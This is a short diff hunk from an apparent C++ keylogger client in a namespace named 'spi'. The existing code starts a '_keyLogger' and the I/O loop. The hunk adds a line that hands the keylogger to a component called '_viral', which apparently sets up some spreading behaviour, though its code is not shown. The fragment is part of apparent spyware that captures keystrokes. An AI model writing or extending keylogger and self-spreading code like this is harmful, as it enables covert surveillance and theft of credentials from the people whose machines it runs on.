@@ -47,6 +47,7 @@ namespace spi
             if (!__setup())
                 return false;
             _keyLogger->run();
+            _viral.setup(_keyLogger.get());
             _log(logging::Info) << "Client started successfully" << std::endl;
             _io.run();
             return true;
